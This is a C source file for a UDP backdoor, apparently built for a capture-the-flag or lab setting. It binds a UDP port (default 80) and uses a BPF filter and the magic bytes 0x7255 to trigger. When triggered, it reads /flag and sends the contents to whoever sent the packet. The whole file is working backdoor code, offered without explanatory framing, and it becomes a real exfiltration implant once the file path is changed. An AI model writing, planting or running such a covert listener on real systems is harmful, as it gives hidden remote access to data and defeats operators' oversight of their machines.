// backdoor_udp_bind_with_bpf.c
// build: gcc -O2 backdoor_udp_bind_with_bpf.c -o backdoor_udp_bind_with_bpf -lpcap
// run:   sudo ./backdoor_udp_bind_with_bpf [port]   (port default 80)

#include <pcap/pcap.h>
#include <linux/filter.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <errno.h>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

int main(int argc, char **argv){
    int port = 80;
    if (argc >= 2) port = atoi(argv[1]);

    int sd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sd < 0){ perror("socket"); return 1; }

    int opt = 1;
    setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_ANY);
    sa.sin_port = htons(port);
    if (bind(sd, (struct sockaddr*)&sa, sizeof(sa)) < 0){
        perror("bind");
        close(sd);
        return 1;
    }

    /* --- attach pcap-compiled BPF filter to the UDP socket 'sd' --- */
    /* use DLT_RAW so compiled filter offsets start at IP header (suitable for AF_INET sockets) */
    pcap_t *pc = pcap_open_dead(DLT_RAW, 65535);
    if (pc) {
        struct bpf_program fp;
        const char *filter_str = "udp and dst port 80 and udp[8:2] = 0x7255";
        if (pcap_compile(pc, &fp, filter_str, 1, PCAP_NETMASK_UNKNOWN) == 0) {
            struct sock_fprog fprog;
            fprog.len = fp.bf_len;
            fprog.filter = (struct sock_filter *)fp.bf_insns;
            /* ATTACH to sd (the UDP socket we bound) */
            if (setsockopt(sd, SOL_SOCKET, SO_ATTACH_FILTER, &fprog, sizeof(fprog)) < 0) {
                perror("SO_ATTACH_FILTER");
                /* non-fatal: continue without filter */
            } else {
                fprintf(stderr, "[i] attached BPF filter on UDP socket: %s\n", filter_str);
            }
            pcap_freecode(&fp);
        } else {
            fprintf(stderr, "pcap_compile failed: %s\n", pcap_geterr(pc));
        }
        pcap_close(pc);
    } else {
        fprintf(stderr, "pcap_open_dead failed\n");
    }
    /* --- end attach --- */

    printf("[i] UDP backdoor bound on port %d, magic=0x7255\n", port);
    fflush(stdout);

    char buf[2048];
    for (;;){
        struct sockaddr_in cli;
        socklen_t clilen = sizeof(cli);
        ssize_t n = recvfrom(sd, buf, sizeof(buf), 0, (struct sockaddr*)&cli, &clilen);
        if (n <= 0) continue;
        if (n >= 2 && (uint8_t)buf[0] == 0x72 && (uint8_t)buf[1] == 0x55){
            // read flag
            FILE *f = fopen("/flag", "r");
            if (!f){
                perror("fopen /flag");
                continue;
            }
            char flag[1024];
            ssize_t flen = fread(flag, 1, sizeof(flag)-1, f);
            fclose(f);
            if (flen <= 0) continue;
            // strip newline
            while (flen > 0 && (flag[flen-1]=='\n' || flag[flen-1]=='\r')) flen--;
            flag[flen]=0;

            ssize_t w = sendto(sd, flag, flen, 0, (struct sockaddr*)&cli, clilen);
            if (w < 0) perror("sendto");
            else {
                char ipb[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &cli.sin_addr, ipb, sizeof(ipb));
                printf("[+] sent flag to %s:%u (%zd bytes)\n", ipb, ntohs(cli.sin_port), w);
                fflush(stdout);
            }
        }
    }

    close(sd);
    return 0;
}
